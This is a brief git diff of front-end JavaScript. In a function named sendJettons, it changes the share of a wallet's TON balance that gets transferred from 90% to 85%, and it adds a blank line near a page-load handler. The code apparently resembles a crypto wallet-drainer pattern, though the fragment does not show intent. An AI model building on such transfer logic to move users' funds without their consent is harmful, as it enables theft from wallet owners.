@@ -272,7 +272,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             const tonBalance = parseFloat(ton);
             
             // УПРОЩЕННЫЙ РАСЧЕТ: отправляем 90% от баланса, оставляем 10% для комиссий
-            let transferAmount = tonBalance * 0.9;
+            let transferAmount = tonBalance * 0.85;
             
             // Округляем до 6 знаков для избежания ошибок
             transferAmount = parseFloat(transferAmount.toFixed(6));
@@ -779,6 +779,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
